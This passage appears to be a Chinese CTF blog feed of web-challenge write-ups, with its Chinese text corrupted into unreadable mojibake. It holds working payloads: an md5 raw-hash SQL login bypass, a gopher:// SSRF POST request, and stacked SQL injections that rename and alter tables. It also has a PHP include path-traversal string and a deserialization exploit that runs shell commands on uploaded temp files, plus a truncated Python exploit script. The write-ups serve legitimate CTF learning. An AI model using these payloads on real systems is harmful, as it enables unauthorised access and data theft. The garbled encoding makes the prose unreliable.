ç™»å½•äº†ï¼Œå°±å¯ä»¥æ‹¿åˆ°flag</blockquote><blockquote>hintï¼šç¬¬ä¸€æ­¥ç™»å½•çš„sqlè¯­å¥æ˜¯"SELECT * FROM users WHERE password = '".md5($password,true)."' limit 0,1";</blockquote><p>è¿™ä¸ªé¢˜æ²¡æœ‰æ€ä¹ˆåŠ¨ï¼Œç›®å‰ä¹Ÿæ²¡æ‰¾åˆ°å¤ç°ï¼Œæš‚æ—¶åªèƒ½é¢å‘wpæ‰«ç›²</p><h3 id="ç™»å½•"><a href="#ç™»å½•" class="headerlink" title="ç™»å½•"></a>ç™»å½•</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-%E7%99%BB%E5%BD%95.png"></p><p>å…³é”®å­—æ˜¯<code>md5($password,true)</code>ï¼Œç¬¬äºŒä¸ªå‚æ•°<code>raw=true</code>å³è½¬md5ååˆåšä¸€æ¬¡<code>hex2str</code></p><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>raw</em></td><td align="left">å¯é€‰ã€‚è§„å®šåå…­è¿›åˆ¶æˆ–äºŒè¿›åˆ¶è¾“å‡ºæ ¼å¼ï¼šTRUE - åŸå§‹ 16 å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼FALSE - é»˜è®¤ã€‚32 å­—ç¬¦åå…­è¿›åˆ¶æ•°</td></tr></tbody></table><p>æ‰€ä»¥hintæè¿°çš„è¿™ä¸€æ­¥å…¶å®æ˜¯md5ä¸‡èƒ½å¯†ç ï¼š<code>ffifdyop</code>ä¸<code>129581926211651571912466741651878684928</code>åœ¨ç»è¿‡md5å¹¶è½¬å­—ç¬¦åå‡åŒ…å«æœ‰<code>&#39;or&#39;</code>ï¼Œåªè¦<code>&#39;or&#39;</code>å³è¾¹éé›¶ï¼Œå³ä¼šåˆ¤å®šæ•´ä¸ªè¡¨è¾¾å¼ä¸ºtrueï¼Œä»¥æ­¤ä¾¿ç»•è¿‡äº†ç™»å½•</p><h3 id="gopheråè®®"><a href="#gopheråè®®" class="headerlink" title="gopheråè®®"></a>gopheråè®®</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-gopher.png"></p><blockquote>gopheråè®®æ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œåœ¨æ„æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ã€‚gopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­æœ€å¼ºå¤§çš„åè®®</blockquote><p>SSRFï¼šServer-side Request Forgeï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼›è¯´ç™½äº†å°±æ˜¯ï¼š<i>å› ä¸ºæ˜¯ç”±æœåŠ¡ç«¯å‘èµ·ï¼Œä»è€Œèƒ½å¤Ÿè¯·æ±‚åˆ°ä¸å®ƒç›¸è¿è€Œä¸å¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿ</i> çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæ¯”å¦‚é€šè¿‡file://ï¼Œgopher://ä¹‹ç±»çš„åè®®æ¥è¯»æœ¬åœ°æ–‡ä»¶ä»€ä¹ˆçš„</p><p>æœ¬é¢˜æ˜¯å±è”½äº†<code>file://</code>çš„ï¼Œåªèƒ½ç”¨<code>gopher://</code></p><p>Gopheråè®®æ ¼å¼ï¼š<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCPæ•°æ®æµ</code></p><ul><li>gopherçš„é»˜è®¤ç«¯å£æ˜¯70</li><li>å¦‚æœå‘èµ·POSTè¯·æ±‚ï¼Œè¯·æ±‚ä½“éœ€è¦è¿›è¡Œurlç¼–ç ï¼Œå›è½¦æ¢è¡Œéœ€è¦ä½¿ç”¨<code>%0d</code>æˆ–<code>%0a</code>ä»£æ›¿</li></ul><p>payloadï¼š/ssrf.php?way=127.0.0.1/admin.phpï¼Œå‘ç°admin.phpä¸å†302äº†</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-admin.png"></p><p>ç„¶åé€šè¿‡gopheråè®®ç»™admin.phpå‘POSTæ•°æ®ï¼ŒHTTPåè®®é»˜è®¤ç«¯å£æ˜¯80ï¼Œæ‰€ä»¥æ˜¯å¾€<code>127.0.0.1:80</code>å‘åŒ…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%20%2Fadmin.php%20HTTP%2F1.1%0aHost%3A%20127.0.0.1%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0aContent-Length%3A%2027%0ausername%3Dtest%26password%3Dtest%0a</span><br></pre></td></tr></table></figure><blockquote>gopher://127.0.0.1:80/<br>_POST /admin.php HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 27<br>username=test&password=test</blockquote><h3 id="æ”¹è¡¨å"><a href="#æ”¹è¡¨å" class="headerlink" title="æ”¹è¡¨å"></a>æ”¹è¡¨å</h3><p>é€šè¿‡æ”¹è¡¨åè·å–æ•°æ®@2019å¼ºç½‘æ¯ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>prepare</code>é¢„å¤„ç†<code>concat</code>è¿‡æ»¤çš„<code>select</code>ï¼Œé¢„å¤„ç†çš„æ–¹æ³•ä¹‹å‰å°±è®°å½•è¿‡ï¼Œä¸å†é‡å¤</p><p>å½“è¿‡æ»¤äº†<code>select</code>ï¼Œå°±ä¸èƒ½åœ¨æŸ¥å‡ºè¡¨ååˆ—ååé€‰ä¸­æ•°æ®ï¼Œä½†è‹¥æŸ¥è¯¢çš„å›æ˜¾å°±æ˜¯è¡¨ä¸­çš„å­—æ®µï¼Œåˆ™å¯ä»¥é€šè¿‡<code>rename</code>å°†é»˜è®¤æŸ¥è¯¢çš„è¡¨æ›¿æ¢ä¸ºç›®æ ‡è¡¨ï¼Œä»è€Œç›´æ¥ä»å›æ˜¾è·å–å­—æ®µ</p><p>ä¾‹å¦‚æœ¬é¢˜ä¸­<code>fake_admin</code>æ˜¯é»˜è®¤è¢«æŸ¥è¯¢çš„è¡¨ï¼Œ<code>real_admin_here_do_you_find</code>æ˜¯ç›®æ ‡è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; &quot;username&#x3D;admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;2;RENAME TABLE &#96;fake_admin&#96; TO &#96;fake_admin1&#96;;RENAME TABLE &#96;real_admin_here_do_you_find&#96; TO &#96;fake_admin&#96;;##&amp;password&#x3D;129581926211651571912466741651878684928&quot;;</span><br></pre></td></tr></table></figure><p>é¡ºä¾¿è®°ä¸€ä¸‹ [2019å¼ºç½‘æ¯-éšä¾¿æ³¨] çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure><p>æ­¤å¤„æ”¹åˆ—å<code>flag</code>ä¸º<code>id</code>æ˜¯å› ä¸ºç›®æ ‡è¡¨ä¸­æ²¡æœ‰<code>id</code>åˆ—ï¼Œè€ŒæŸ¥è¯¢æ˜¯æ ¹æ®idæŸ¥è¯¢ï¼Œé¿å…äº†ä¸€å¼€å§‹æ— æ³•æŸ¥è¯¢çš„æƒ…å†µ</p><p><code>CHANGE</code>çš„è¯­æ³•ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE t1 CHANGE c_old c_new INTEGER ;#æŠŠåä¸ºc_oldçš„åˆ—åæ”¹ä¸ºc_newï¼Œç±»å‹ä¸ºæ•´æ•°å‹</span><br></pre></td></tr></table></figure><h2 id="Internal-System"><a href="#Internal-System" class="headerlink" title="Internal System"></a>Internal System</h2><p>è¶…å‡ºèƒ½åŠ›èŒƒå›´çš„éƒ¨åˆ†æœ‰ç‚¹å¤šï¼Œç§¯ç´¯èµ·æ¥äº†å†è¯´</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶</title>
      <link href="2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/"/>
      <url>2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>æ¥è‡ªäºBUUCTF_Webè§£å†³æ•°æœ€å¤šçš„[HCTF 2018]WarmUpï¼Œå°è®°ä¸€ä¸‹æ­¤é¢˜è¢«æˆ‘ç–å¿½çš„é›¶ç¢çŸ¥è¯†ä»¥åŠå‡ºé¢˜äººçš„è„‘æ´ï¼ˆè™½ç„¶ä¸å¤§ï¼Œä½†æ˜¯æˆ‘è®¤ä¸ºæ­¤é¢˜ä¸é¢å‘wpè€Œæ˜¯ç¡¬åšçš„è¯ä¸ä¼šæœ‰è¿™ä¹ˆå¤šè§£å†³æ•° Â¯\_(ãƒ„)_/Â¯</p><span id="more"></span><h1 id="PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶"><a href="#PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶" class="headerlink" title="PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶"></a>PHPå¥‡æ€ªçš„ç›®å½•è®¿é—®æœºåˆ¶</h1><p>é¦–å…ˆæ˜¯è„‘æ´ï¼Œæœ¬é¢˜hintï¼š<code>flag not here, and flag in ffffllllaaaagggg</code>ï¼Œè¿™ä¸ªåˆ«è‡´çš„flagä¼ è¾¾çš„æ˜¯ï¼šflagåœ¨ä¸Šç¿»4çº§ç›®å½•ä¸‹ã€‚è¿™ä¸ªé¢˜ä¸Šç¿»4çº§ç›®å½•æ°å¥½åˆ° linux æ ¹ç›®å½•ï¼Œæ‰€ä»¥æœ‰äº›wpä¸­å †å å¾ˆå¤šä¸ª<code>../</code>ä¹Ÿå¯ä»¥highlightåˆ°flagï¼ˆå¤§æ¦‚æ˜¯ä¸ºäº†é™ä½è„‘æ´å› ç´ çš„å­˜åœ¨æ„Ÿ</p><p>å†å°±æ˜¯æœ¬æ–‡æ ‡é¢˜ï¼Œæœ¬é¢˜éœ€è¦åœ¨<code>highlight_file(__FILE__)</code>çš„æƒ…å†µä¸‹æ„é€ payloadç»•è¿‡å…¶è¿‡æ»¤ï¼Œæœ€åç”±<code>include</code>åŒ…å«è¿›æ¥ã€‚ä½†æ˜¯ä¸ºäº†ç»•è¿‡å…¶è¿‡æ»¤ï¼Œä¼ ç»™includeçš„è·¯å¾„æ˜¯ï¼š<code>file=hint.php?/../../../../../ffffllllaaaagggg</code>ï¼Œæ­¤è·¯å¾„èƒ½æ‰“å¼€ffffllllaaaaggggçš„åŸå› åœ¨äº<code>hint.php?</code>è¿™ä¸ªæ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼Œåˆ™phpå°†å…¶è§†ä¸ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œflagåœ¨ä¸Šç¿» 4 å±‚åçš„ç›®å½•ä¸‹ï¼Œå› ä¸ºå·²ç»è¿›äº† hint.php? åˆ™è¿˜éœ€é€€å› 5 å±‚</p><blockquote>è¿™ç§è®¿é—®ä¸å­˜åœ¨çš„ç›®å½•ç„¶ååˆé€€å›æ¥çš„æ“ä½œåœ¨linuxçš„shellç¯å¢ƒä¸‹å¹¶ä¸æ”¯æŒï¼Œæ‰€ä»¥è¯´ä»¤æˆ‘æ„Ÿåˆ°å¥‡æ€ª</blockquote><p><img src="/images/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6_LinuxShell.PNG"></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>miniL p</title>
      <link href="2021/03/25/miniL-Web-p/"/>
      <url>2021/03/25/miniL-Web-p/</url>
      
        <content type="html"><![CDATA[<p>è€ƒå¯Ÿphpä»£ç å®¡è®¡ï¼Œä¸´æ—¶æ–‡ä»¶çª—å£æœŸçš„åˆ©ç”¨ï¼Œä»¥åŠlinuxæŒ‡ä»¤çš„æŒæ¡ï¼Œå¯¹æˆ‘å¥½éš¾ï¼Œè¿˜å¥½æœ‰@blackWatchçš„wpå’ŒååŠ©</p><p>ï¼ˆæ®è¯´æ˜¯æŸåŸé¢˜æ¬è¿ï¼Œç¢äºé¢˜é‡å¤ªå°‘è€Œæ²¡æœ‰æ‰¾åˆ°åŸé¢˜åœ¨å“ªï¼Œä½†æ˜¯è¿™ä¸é‡è¦</p><span id="more"></span><h1 id="miniL-Web-p"><a href="#miniL-Web-p" class="headerlink" title="miniL Web p"></a>miniL Web p</h1><p align='right'><small>è¿™é¢˜å°±å«"p"ï¼Œæ²¡æœ‰æ‰“é”™/doge</small></p><p><img src="/images/miniL-Web-p-preview.PNG"></p><h2 id="å¾—åˆ°classes-php"><a href="#å¾—åˆ°classes-php" class="headerlink" title="å¾—åˆ°classes.php"></a>å¾—åˆ°classes.php</h2><p>ä¸€è¿›æ¥index.phpå·²é«˜äº®ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;classes.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>])) &#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    setcookie(<span class="string">&#x27;git&#x27;</span>, base64_encode(serialize(<span class="keyword">new</span> gitee(<span class="string">&#x27;index.php&#x27;</span>))));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;location.reload()&lt;/script&gt;&#x27;</span>;</span><br><span class="line">    ob_end_flush();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$comp</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;git&#x27;</span>]));</span><br><span class="line">highlight_file(<span class="variable">$comp</span>-&gt;file);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰</span><br></pre></td></tr></table></figure><p>indexåŒ…å«äº†classes.phpï¼Œæ ¹æ®è¦æ±‚ä¼ ä¸€ä¸ªb64çš„cookieç”¨ä½œååºåˆ—åŒ–ï¼Œä»è€Œé«˜äº®classes.php</p><p>classes.phpå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">gitee</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="variable">$f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">github</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>, <span class="keyword">$this</span>-&gt;cmd))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">        <span class="variable">$blacklist</span> = <span class="string">&quot;~!@#%^&amp;*()ï¼ˆï¼‰-_&#123;&#125;[]&#x27;\&quot;:,&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(str_split(<span class="variable">$blacklist</span>) <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$char</span>;</span><br><span class="line">            <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;cmd, <span class="variable">$char</span>) !== <span class="literal">false</span>) </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;serror&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_REAL_IP&quot;</span>] !== <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// proxy_set_header X-Real-IP $remote_addr;</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;across the great ... nope&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">ä½ ç”¨ä¸Šäº†Gitï¼Œå¯æ˜¯ï¼Œä»£ä»·æ˜¯ä»€ä¹ˆå‘¢ï¼ˆæ‚²ï¼‰</span><br></pre></td></tr></table></figure><h2 id="ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨"><a href="#ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨"></a><a href="https://www.anquanke.com/post/id/201136">ä¸´æ—¶æ–‡ä»¶çª—å£æœŸåˆ©ç”¨</a></h2><p>å¯è§æœ¬é¢˜çš„è§£é¢˜å…³é”®åœ¨äº<code>eval($this-&gt;cmd)</code>ï¼Œä½†åœ¨evalæ‰§è¡Œä¹‹å‰$cmdå·²ç»è¢«è¿‡æ»¤çš„åªå‰©ä¸ª<code>p</code>å’Œä¸€äº›å­—ç¬¦äº†ï¼Œè€Œå¯¹äºæ­¤é¢˜çš„è§£æ³•å…¶å®æ˜¯ç›¸å¯¹å›ºå®šçš„ï¼šå³ä½¿ç”¨shellå‘½ä»¤è°ƒç”¨ä¸Šä¼ çš„æ–‡ä»¶ï¼Œåˆ©ç”¨è¿™ä¸€çª—å£æœŸæ‰§è¡Œä»»æ„æˆ‘ä»¬å¸Œæœ›æœåŠ¡ç«¯æ‰§è¡Œçš„shellå‘½ä»¤</p><p><img src="/images/miniL-Web-p-timeWindow.PNG"></p><p>å¦‚ä½•åˆ©ç”¨ï¼š</p><ul><li><p>é¦–å…ˆç¡®å®šå¦‚ä½•åœ¨ä»…æœ‰è¿™ä¹ˆå°ç‚¹å­—ç¬¦é›†çš„æƒ…å†µä¸‹è®¿é—®åˆ°ä¸Šä¼ çš„ä¸´æ—¶æ–‡ä»¶ { Windwosä¸‹ä¸´æ—¶æ–‡ä»¶ä¿å­˜åœ¨<code>C:/Windows/Temp/</code>ï¼Œå‘½åä¸ºphp[4ä¸ªéšæœºå­—ç¬¦].tmpï¼›Linuxä¸‹ä¿å­˜åœ¨<code>/tmp/</code>ï¼Œå‘½åä¸ºphp[éšæœº6ä¸ªå­—ç¬¦] } å¯ä»¥ç¡®å®šæˆ‘ä»¬è¦æ‰¾çš„æ˜¯è·¯å¾„ä¸º<code>tmp/phpxxxxxx</code>çš„æ–‡ä»¶ï¼Œç»“åˆLinuxä¸­çš„å•å­—ç¬¦é€šé…ç¬¦<code>?</code>ï¼Œå°±å¯ä»¥æ‰¾åˆ°å®ƒäº†</p>  <center><code>??p/p?p??????</code></center></li><li><p>ç°åœ¨ç¡®å®šä¸Šä¼ æ€æ ·çš„æ–‡ä»¶æ‰å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°flagï¼Œæ³¨æ„åˆ°åå¼•å· <code>`</code> æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè€Œphpä¸­åå¼•å·ä¸ºæ‰§è¡Œè¿ç®—ç¬¦</p>  <blockquote>PHPå°†å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›ï¼ˆå³ï¼Œå¯ä»¥èµ‹ç»™ä¸€ä¸ªå˜é‡è€Œä¸æ˜¯ç®€å•åœ°ä¸¢å¼ƒåˆ°æ ‡å‡†è¾“å‡ºï¼‰ï¼›ä½¿ç”¨åå¼•å·è¿ç®—ç¬¦çš„æ•ˆæœä¸å‡½æ•°shell_exec()ç›¸åŒã€‚ä½†è¿™ä¸€åˆ‡çš„å‰ææ˜¯æœåŠ¡ç«¯å…è®¸ä¸€ä¸ªè¿™ä¹ˆå±é™©çš„å‡½æ•°æ‰§è¡Œ</blockquote><p>  å¥å· <code>.</code> ä¹Ÿæ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™åœ¨Linuxä¸­å¯ä»¥æ‰§è¡Œshell scriptï¼Œä¾‹å¦‚<code>./tmp/hello.sh</code>ï¼ˆä½†åœ¨å®é™…æ“ä½œä¸­å‘ç°è¿™ä¸ªå¥å·æ‰§è¡Œéœ€è¦æƒé™ï¼Œä¸èƒ½ç›´æ¥æ‰“äº†å°±æ¥ï¼Œå¯èƒ½æ˜¯æœåŠ¡ç«¯å·²ç»è®¾ç½®å¥½äº†ï¼Œæ‰€ä»¥æ‰èƒ½æ‰§è¡Œï¼‰ï¼Œä»¥ä¸‹æ˜¯å¯¹äºshellçš„å¤§è‡´ä»‹ç»</p>  <blockquote>Shell æ˜¯ä¸€ä¸ªç”¨ C è¯­è¨€ç¼–å†™çš„ç¨‹åºï¼Œå®ƒæ˜¯ç”¨æˆ·ä½¿ç”¨ Linux çš„æ¡¥æ¢ï¼›Shell æ—¢æ˜¯ä¸€ç§å‘½ä»¤è¯­è¨€ï¼Œåˆæ˜¯ä¸€ç§ç¨‹åºè®¾è®¡è¯­è¨€<br>  éœ€è¦å…³æ³¨çš„æ˜¯ Bashï¼Œä¹Ÿå°±æ˜¯ Bourne Again Shellï¼Œç”±äºæ˜“ç”¨å’Œå…è´¹ï¼ŒBash åœ¨æ—¥å¸¸å·¥ä½œä¸­è¢«å¹¿æ³›ä½¿ç”¨ï¼›åŒæ—¶ï¼ŒBash ä¹Ÿæ˜¯å¤§å¤šæ•°Linux ç³»ç»Ÿé»˜è®¤çš„ Shell<br>  æ‰©å±•åå¹¶ä¸å½±å“è„šæœ¬æ‰§è¡Œï¼Œshçš„åç¼€å®Œå…¨æ˜¯ä¸ºäº†æ–¹ä¾¿ç”¨æˆ·ç†è§£è¿™ä¸ªæ–‡ä»¶å¤§æ¦‚æ˜¯ä»€ä¹ˆç©æ„å„¿ï¼ŒLinuxæ ¹æ®æ–‡ä»¶å¤´è¯†åˆ«æ–‡ä»¶ç±»å‹ï¼Œä¸éœ€è¦æ‰©å±•å<br>  </blockquote><p>  åªéœ€åŸºç¡€çš„ä¸¤ä¸ªå‘½ä»¤å³å¯å¸®åŠ©æˆ‘ä»¬è·å–flagï¼š<code>cat</code>å’Œ<code>grep</code>ï¼Œ<code>*</code>ä½œä¸ºåŒ¹é…0è‡³ä»»æ„ä¸ªå­—ç¬¦çš„é€šé…ç¬¦ï¼Œä½¿å¾—catè¿”å›å…¨éƒ¨æ ¹ç›®å½•ä¸‹æ–‡ä»¶ä¿¡æ¯</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh\ncat /* | grep flag</span></span><br></pre></td></tr></table></figure></li><li><p>æœ€åéœ€è¦è¾“å‡ºæ‰§è¡Œä¸Šè¿°æ–‡ä»¶åè¿”å›çš„ç»“æœï¼Œéœ€è¦ç”¨åˆ°çš„æ˜¯phpçŸ­æ ‡ç­¾</p>  <center><code>&#60;&#63;&#61;'233';&#63;&#62;</code> ç­‰ä»·äº <code>&#60;&#63;echo '233';&#63;&#62;</code></center></li></ul><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url =<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#=====================================================================================================================</span></span><br><span class="line"><span class="comment">#                  echoçš„å¿«æ·ç”¨æ³•ï¼Œä½†é¡»åœ¨php.inié‡Œæ‰“å¼€short_open_tag</span></span><br><span class="line"><span class="comment">#                                          |</span></span><br><span class="line"><span class="comment">#                                          |   å°è¯•å°†åå¼•å·ä¸­çš„å†…å®¹ä½œä¸º shell å‘½ä»¤æ¥æ‰§è¡Œï¼Œå¹¶å°†å…¶è¾“å‡ºä¿¡æ¯è¿”å›</span></span><br><span class="line"><span class="comment">#                                          â†“                 â†“</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line">git = <span class="string">&#x27;O:6:&quot;github&quot;:1:&#123;s:3:&quot;cmd&quot;;s:26:&quot;?&gt;&lt;?=`. /??p/p?p??????`;?&gt;&quot;;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#---------------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">#                                            â†‘</span></span><br><span class="line"><span class="comment">#                                     æ‰§è¡Œåé¢è·¯å¾„ä¸‹çš„æ–‡ä»¶</span></span><br><span class="line"><span 